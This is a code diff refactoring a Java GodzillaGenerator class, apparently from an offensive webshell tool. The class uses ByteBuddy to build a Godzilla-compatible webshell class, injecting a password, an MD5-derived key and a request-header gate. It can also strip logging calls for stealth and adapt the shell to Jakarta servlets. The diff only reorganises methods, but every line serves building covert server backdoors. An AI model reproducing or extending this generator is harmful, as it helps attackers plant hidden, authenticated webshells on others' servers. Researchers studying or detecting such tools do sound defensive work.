@@ -17,33 +17,45 @@ import org.apache.commons.codec.digest.DigestUtils;
  * @since 2024/11/23
  */
 public class GodzillaGenerator {
-    public static byte[] generate(ShellConfig config, GodzillaConfig shellConfig) {
-        if (shellConfig.getClazz() == null) {
-            throw new IllegalArgumentException("shellConfig.getClazz() == null");
+    private final ShellConfig shellConfig;
+    private final GodzillaConfig godzillaConfig;
+
+    public GodzillaGenerator(ShellConfig shellConfig, GodzillaConfig godzillaConfig) {
+        this.shellConfig = shellConfig;
+        this.godzillaConfig = godzillaConfig;
+    }
+
+    public DynamicType.Builder<?> getBuilder() {
+        if (godzillaConfig.getClazz() == null) {
+            throw new IllegalArgumentException("godzillaConfig.getClazz() == null");
         }
-        String md5Key = DigestUtils.md5Hex(shellConfig.getKey()).substring(0, 16);
-        String md5 = DigestUtils.md5Hex(shellConfig.getPass() + md5Key).toUpperCase();
+        String md5Key = DigestUtils.md5Hex(godzillaConfig.getKey()).substring(0, 16);
+        String md5 = DigestUtils.md5Hex(godzillaConfig.getPass() + md5Key).toUpperCase();
 
         DynamicType.Builder<?> builder = new ByteBuddy()
-                .redefine(shellConfig.getClazz())
-                .name(shellConfig.getClassName())
-                .visit(new TargetJreVersionVisitorWrapper(config.getTargetJreVersion()))
+                .redefine(godzillaConfig.getClazz())
+                .name(godzillaConfig.getClassName())
+                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
                 .constructor(ElementMatchers.any())
                 .intercept(SuperMethodCall.INSTANCE
-                        .andThen(FieldAccessor.ofField("pass").setsValue(shellConfig.getPass()))
+                        .andThen(FieldAccessor.ofField("pass").setsValue(godzillaConfig.getPass()))
                         .andThen(FieldAccessor.ofField("key").setsValue(md5Key))
                         .andThen(FieldAccessor.ofField("md5").setsValue(md5))
-                        .andThen(FieldAccessor.ofField("headerName").setsValue(shellConfig.getHeaderName()))
-                        .andThen(FieldAccessor.ofField("headerValue").setsValue(shellConfig.getHeaderValue())));
+                        .andThen(FieldAccessor.ofField("headerName").setsValue(godzillaConfig.getHeaderName()))
+                        .andThen(FieldAccessor.ofField("headerValue").setsValue(godzillaConfig.getHeaderValue())));
 
-        if (config.isJakarta()) {
+        if (shellConfig.isJakarta()) {
             builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
         }
 
-        if (config.isDebugOff()) {
+        if (shellConfig.isDebugOff()) {
             builder = LogRemoveMethodVisitor.extend(builder);
         }
+        return builder;
+    }
 
+    public byte[] getBytes() {
+        DynamicType.Builder<?> builder = getBuilder();
         try (DynamicType.Unloaded<?> make = builder.make()) {
             return make.getBytes();
         }
